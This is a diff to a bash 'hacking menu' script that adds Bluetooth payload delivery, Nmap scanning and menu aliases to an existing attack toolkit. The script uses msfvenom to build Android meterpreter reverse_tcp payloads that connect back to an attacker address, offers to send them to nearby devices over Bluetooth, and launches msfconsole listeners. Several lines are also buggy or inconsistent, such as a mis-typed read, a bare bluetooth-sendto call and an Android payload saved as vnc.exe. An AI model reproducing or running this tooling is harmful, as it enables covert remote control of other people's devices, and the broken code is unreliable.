@@ -1,4 +1,16 @@
 #!/bin/bash
+echo "do you use systemctl or service? "
+read sq
+if [[ "$sq" == 'ctl' ]];
+then 
+sudo systemctl start postgresql
+clear
+fi
+if [[ "$sq" == 'service' ]];
+then 
+sudo service postgresql start
+clear
+fi
 ipfile="ip_file.tmp"
 clear
 echo "88888888888                    8888"
@@ -19,8 +31,10 @@ echo "2. Ios Exploits (second)"
 echo "3. Wifi hacking (third)"
 echo "4. SSH into pi (fourth)"
 echo "5. Vnc Windows (fifth)"
+echo "6. Nmap (sixth)"
+echo "7. Bluetooth scanning (seventh)"
 read f
-if [[ "$f" == 'first' || "$f" == '1'  ]];
+if [[ "$f" == 'first' || "$f" == '1' || "$f" == 'android'  ]];
  then
  echo --Android Exploits--
  echo "1.Browser "
@@ -45,11 +59,17 @@ if [[ "$f" == 'first' || "$f" == '1'  ]];
   read ip
   echo $ip >>ipfile
   echo "app name:"
-  read name
-  echo "enter path :"
-#50
- 
+  read name 
     msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
+    echo "do you want to send the payload via bluethooth? (y/n) "
+    read bt
+    if [[ "$bt" == 'y' || "$bt" == 'Y' ]];
+     then 
+     btscanner hci0 
+     echo "enter the address"
+     read btad
+     bluetooth-sendto 
+    fi
     msfconsole -r android.rc
 fi
 
@@ -60,7 +80,7 @@ if [[ "$s" == 'browser' || "$s" == '1' ]];
 fi
 fi
 #60
-if [[ "$f" == 'second' || "$f" == '2' ]];
+if [[ "$f" == 'second' || "$f" == '2' || "$f" == 'ios' ]];
  then 
  echo --Ios Exploits--
  echo "1.Browser-based exploit "
@@ -118,6 +138,18 @@ read $ipad
 msfvenom -p android/meterpreter/reverse_tcp lhost= $ipad lport=24 x>vnc.exe
 msfconsole -r win_vnc.rc
 fi
+if [[ "$f" == 'Nmap' || "$f" == 'nmap' || "$f" == 'NMAP' || "$f" == '6' || "$f" == 'sixth' ]];
+then 
+echo "Please enter the ip/domain of the target: "
+read target
+echo "scan -A(-F) or -sn?"
+read scan
+if [[ "$scan" == '1' || "$scan" == '2' ]];
+then 
+sudo nmap -f -F -A $target
+fi
+else sudo nmap -f -sn $target
+fi
 
 sleep 2
 clear
@@ -127,3 +159,8 @@ echo
 echo
 echo
 sleep 2
+echo FoSiL BiTcHeAsS
+echo
+echo
+echo
+echo
